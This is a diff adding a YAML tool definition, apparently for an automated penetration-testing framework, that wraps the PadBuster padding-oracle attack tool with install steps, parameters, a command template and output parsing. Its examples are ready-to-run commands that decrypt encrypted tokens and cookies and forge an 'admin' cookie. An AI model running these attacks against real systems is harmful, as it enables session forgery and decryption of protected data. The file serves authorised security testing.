@@ -1,0 +1,110 @@
+id: ext_padbuster
+name: PadBuster Padding Oracle 攻击
+description: "自动化 Padding Oracle 攻击工具，支持 AES-CBC 密文解密和任意明文加密。适用于加密 Cookie/Token/URL 参数的 Padding Oracle 漏洞利用"
+homepage: "https://github.com/AonCyberLabs/PadBuster"
+category: poc
+binary: padbuster
+version_cmd: "padbuster 2>&1 | head -3"
+
+install:
+  manual: |
+    git clone https://github.com/AonCyberLabs/PadBuster.git
+    sudo cp PadBuster/padBuster.pl /usr/local/bin/padbuster
+    sudo chmod +x /usr/local/bin/padbuster
+  deps:
+    - "perl (macOS 自带)"
+    - "Crypt::SSLeay — cpan install Crypt::SSLeay 或 brew install perl (含模块)"
+    - "LWP::UserAgent — cpan install LWP::UserAgent"
+    - "Crypt::OpenSSL::AES — cpan install Crypt::OpenSSL::AES (可选，提升速度)"
+
+parameters:
+  - name: url
+    type: string
+    description: "目标 URL（包含加密参数或用于提交 Cookie 的端点）"
+    required: true
+  - name: encrypted_sample
+    type: string
+    description: "当前加密的密文样本（base64 或 hex 编码）"
+    required: true
+  - name: block_size
+    type: integer
+    description: "加密块大小（AES=16, DES=8）"
+    required: true
+    default: 16
+    enum: [8, 16]
+  - name: cookies
+    type: string
+    description: "Cookie 字符串（当 oracle 在 Cookie 中时必须指定），格式: name=value"
+  - name: encoding
+    type: integer
+    description: "密文编码方式: 0=Base64, 1=hex(小写), 2=.NET URL token, 3=WebSafe Base64, 4=hex(大写)"
+    default: 0
+    enum: [0, 1, 2, 3, 4]
+  - name: plaintext
+    type: string
+    description: "要加密的明文（加密模式，用于伪造合法密文绕过验证）"
+  - name: error
+    type: string
+    description: "自定义错误字符串（用于识别 padding 错误响应，默认依赖 HTTP 状态码差异）"
+  - name: prefix
+    type: string
+    description: "URL 中密文参数前缀"
+  - name: intermediate
+    type: string
+    description: "已知的 intermediate 值（用于恢复中断的攻击）"
+  - name: no_iv
+    type: boolean
+    description: "密文不包含 IV（IV 为全零）"
+    default: false
+  - name: verbose
+    type: boolean
+    description: "详细输出模式"
+    default: false
+
+command_template: |
+  padbuster "{{.url}}" "{{.encrypted_sample}}" {{.block_size}}
+  {{if .cookies}}-cookies "{{.cookies}}"{{end}}
+  {{if .encoding}}-encoding {{.encoding}}{{end}}
+  {{if .plaintext}}-plaintext "{{.plaintext}}"{{end}}
+  {{if .error}}-error "{{.error}}"{{end}}
+  {{if .prefix}}-prefix "{{.prefix}}"{{end}}
+  {{if .intermediate}}-intermediate "{{.intermediate}}"{{end}}
+  {{if .no_iv}}-noiv{{end}}
+  {{if .verbose}}-veryverbose{{end}}
+
+examples:
+  - name: "解密 URL 参数中的密文"
+    command: 'padbuster "http://target/api?token=ENCRYPTED" "ENCRYPTED" 16 -encoding 0'
+    description: "标准 Padding Oracle 解密，Base64 编码，AES-128 块大小"
+
+  - name: "解密 Cookie 中的密文"
+    command: 'padbuster "http://target/" "BASE64_CIPHER" 16 -cookies "captcha=BASE64_CIPHER" -encoding 0'
+    description: "当 oracle 在 Cookie 中时，用 -cookies 指定发送的 cookie"
+
+  - name: "加密自定义明文（伪造 Cookie）"
+    command: 'padbuster "http://target/" "BASE64_CIPHER" 16 -cookies "captcha=BASE64_CIPHER" -encoding 0 -plaintext "admin"'
+    description: "Padding Oracle 加密模式：生成解密后为 'admin' 的合法密文"
+
+  - name: "自定义错误识别"
+    command: 'padbuster "http://target/decrypt?data=ENC" "ENC" 16 -encoding 0 -error "Invalid padding"'
+    description: "当服务器不用 HTTP 状态码区分 padding 错误时，用 -error 指定错误响应中的关键字"
+
+output:
+  mode: stdout
+  parser: text
+  patterns:
+    decrypted: "Decrypted value \\(ASCII\\): (.+)"
+    encrypted: "Encrypted value: (.+)"
+    intermediate: "Block \\d+ Intermediate Bytes: (.+)"
+
+findings_mapping:
+  type: vulnerability
+  severity: critical
+  target_field: url
+  detail_template: "[Padding Oracle] 成功解密/加密密文 — decrypted: {{.decrypted}}"
+
+constraints:
+  timeout: 600s
+  proxy_flag: "-proxy"
+  max_concurrent: 1
+  notes: "每次请求间自动延迟；高并发可能触发 WAF"
